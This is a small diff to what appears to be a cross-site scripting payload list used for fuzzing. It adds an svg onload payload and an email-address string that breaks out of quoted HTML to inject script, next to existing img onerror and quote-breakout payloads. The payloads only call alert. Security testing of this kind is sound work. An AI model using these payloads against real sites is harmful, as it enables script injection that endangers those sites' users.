@@ -11,3 +11,5 @@ http://foo?&apos;-alert(1)-&apos;
 #Fuzzing
 <img src=1 onerror='alert(1)'>
 <img src=1 oNeRrOr=alert`1`>
+<svg/onload=alert("XSS") >
+test@example.com'\"><svg/onload=alert(/xss/)>
